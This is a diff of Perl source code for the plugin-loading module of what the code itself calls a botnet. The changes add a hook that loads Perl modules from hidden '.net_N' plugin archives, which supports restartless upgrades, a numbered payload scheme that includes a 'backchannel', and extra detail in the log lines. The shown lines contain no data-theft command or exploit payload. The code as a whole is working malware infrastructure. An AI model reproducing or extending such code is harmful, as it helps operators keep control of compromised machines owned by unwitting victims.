@@ -27,11 +27,27 @@ package bn::xx;
 # 3 - readme(?)
 # 4 - backchannel
 # 5 - improved upgrader
+# 6 - extra modules, originally part of the main botnet, for restartless upgrading
 
 our $I;    # current index during call
 our @PL;
 our @SEQ;
 our $BOOT = 1;
+
+unshift @INC, sub {
+	return unless $_[1] =~ m%^xx(\d+)/(.*)$%;
+	my ($i, $p) = ($1, $2);
+
+	my $pl = $PL[$i]
+		or die "require $_[1]: xx$i not loaded";
+
+	my $src = $pl->($p)
+		or die "require $_[1]: $p not in archive";
+
+	bn::log "bn::xx require $_[1]";
+
+	\$src;
+};
 
 sub call($$;@)
 {
@@ -69,7 +85,7 @@ my ($i, $flags) = @_;
 # flags 0 - normal load
 # flags 1 - on boot
 
-bn::log "bn::xx XX$i running";
+bn::log "bn::xx XX$i $SEQ[$i] running";
 
 call $i, "load", $flags;
 bn::event::inject "loadxx$i", $PL[$i];
@@ -93,7 +109,7 @@ if (my $pl = plpack::load "$::BASE/.net_$i") {
 	};
 
 	if ($verchk->(pl => $bn::PLVERSION) and $verchk->(bn => $bn::BNVERSION)) {
-		bn::log "bn::xx XX$i loading";
+		bn::log "bn::xx XX$i $SEQ[$i] loading";
 
 		unload $i;
 
@@ -102,7 +118,7 @@ if (my $pl = plpack::load "$::BASE/.net_$i") {
 
 		load_init $i, 0 unless $BOOT;
 	} else {
-		bn::log "bn::xx XX$i ver mismatch";
+		bn::log "bn::xx XX$i $SEQ[$i] ver mismatch";
 
 		Coro::AnyEvent::sleep 15;
 	}
